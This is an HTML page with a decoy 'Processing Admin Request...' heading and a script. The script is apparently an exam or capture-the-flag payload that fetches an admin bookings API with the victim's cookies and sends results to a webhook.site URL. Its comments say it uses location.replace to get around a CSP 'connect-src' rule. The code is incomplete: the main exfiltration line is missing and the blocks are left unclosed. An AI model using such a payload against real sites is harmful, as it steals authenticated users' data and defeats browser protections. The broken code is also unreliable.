<!DOCTYPE html>

<body>
    <h1>Processing Admin Request...</h1>
    <script>
        const webhook = "https://webhook.site/966eca5b-8dbd-405f-895e-a47c742aa523";
        const base = "https://api-bugbounty-exam.hashacademy.co";

        async function exfiltrate() {
            try {
                // We fetch the admin bookings where the 'FlagSeeker' car was found
                const response = await fetch(`${base}/api/admin/bookings`, { credentials: "include" });
                const data = await response.text();
                
                // Use location.replace to bypass CSP 'connect-src'
                // This sends the data as a Base64 string in the URL

            } catch (e) {
                // Fallback to stats if bookings fail
                window.location.replace(`${webhook}?error=${btoa(e.message)}`);

        exfiltrate();
